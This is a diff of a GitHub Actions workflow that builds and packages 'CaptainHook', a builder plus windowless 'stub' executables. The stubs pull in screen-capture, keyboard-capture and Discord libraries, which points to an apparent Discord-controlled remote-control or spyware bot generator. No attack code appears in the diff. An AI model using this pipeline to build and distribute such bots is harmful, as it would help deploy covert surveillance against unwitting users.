@@ -25,28 +25,30 @@ jobs:
       - name: Install dependencies
         run: |
           python -m pip install --upgrade pip
-          pip install pyinstaller discord.py aiohttp mss psutil pyautogui pynput ping3 rich
+          pip install pyinstaller discord.py aiohttp mss psutil pyautogui pynput ping3 rich cryptography
 
       - name: Build Stub Binary
         shell: bash
+        env:
+          STUB_BUILD: 1
         run: |
           # Create staging
           mkdir -p build_staging
           cp -r src build_staging/
           
-          # Preset selection logic (simplified for stub build)
-          # We build the stub with placeholders in Config.py
+          # Clean name for the binary (no spaces)
+          SAFE_NAME=$(echo "${{ matrix.preset }}" | tr '[:upper:]' '[:lower:]' | tr ' ' '_')
           
-          pyinstaller --onefile --noconsole --name stub_${{ matrix.preset }} --paths=build_staging build_staging/src/client/main.py
+          pyinstaller --onefile --noconsole --name stub_${SAFE_NAME} --paths=build_staging --collect-all discord --collect-all mss build_staging/src/client/main.py
           
           mkdir -p stubs
-          cp dist/stub_${{ matrix.preset }}.exe stubs/
+          cp dist/stub_${SAFE_NAME}.exe stubs/
 
       - name: Upload Stub Artifact
         uses: actions/upload-artifact@v4
         with:
           name: stub-${{ matrix.preset }}
-          path: stubs/stub_${{ matrix.preset }}.exe
+          path: stubs/
 
   build-builder:
     runs-on: ${{ matrix.os }}
@@ -87,21 +89,36 @@ jobs:
         with:
           path: artifacts
 
-      - name: Organize Release Folder
+      - name: Organize & Package Release
         run: |
-          mkdir release
-          mkdir release/stubs
-          cp artifacts/builder-windows-latest/CaptainHookBuilder.exe release/
-          cp artifacts/builder-ubuntu-latest/CaptainHookBuilder release/CaptainHookBuilder_linux
-          cp artifacts/builder-macos-latest/CaptainHookBuilder release/CaptainHookBuilder_mac
-          cp artifacts/stub-*/*.exe release/stubs/
+          mkdir -p release_pkgs
+          
+          # 1. Windows Package
+          mkdir -p win_pkg/stubs
+          cp artifacts/builder-windows-latest/CaptainHookBuilder.exe win_pkg/
+          cp artifacts/stub-*/*.exe win_pkg/stubs/
+          zip -r release_pkgs/CaptainHook_Windows.zip win_pkg/*
+          
+          # 2. Linux Package
+          mkdir -p linux_pkg/stubs
+          cp artifacts/builder-ubuntu-latest/CaptainHookBuilder linux_pkg/
+          cp artifacts/stub-*/*.exe linux_pkg/stubs/ # Stubs are .exe but work for patching
+          zip -r release_pkgs/CaptainHook_Linux.zip linux_pkg/*
+          
+          # 3. macOS Package
+          mkdir -p mac_pkg/stubs
+          cp artifacts/builder-macos-latest/CaptainHookBuilder mac_pkg/
+          cp artifacts/stub-*/*.exe mac_pkg/stubs/
+          zip -r release_pkgs/CaptainHook_Mac.zip mac_pkg/*
 
       - name: Create Release
         uses: softprops/action-gh-release@v2
         with:
-          files: |
-            release/CaptainHookBuilder.exe
-            release/CaptainHookBuilder_linux
-            release/CaptainHookBuilder_mac
-            release/stubs/*
-          body: "CaptainHook v3.1.0 Standalone Release. Includes pre-compiled Builder and Bot Stubs for instant generation."
+          files: release_pkgs/*.zip
+          body: |
+            ⚓ **CaptainHook v0.1.0 Official Release**
+            
+            Download the ZIP for your OS, extract it, and run the `CaptainHookBuilder`.
+            The bot will be generated instantly using the included stubs.
+            
+            **Note:** Stubs are currently pre-compiled for Windows (.exe).
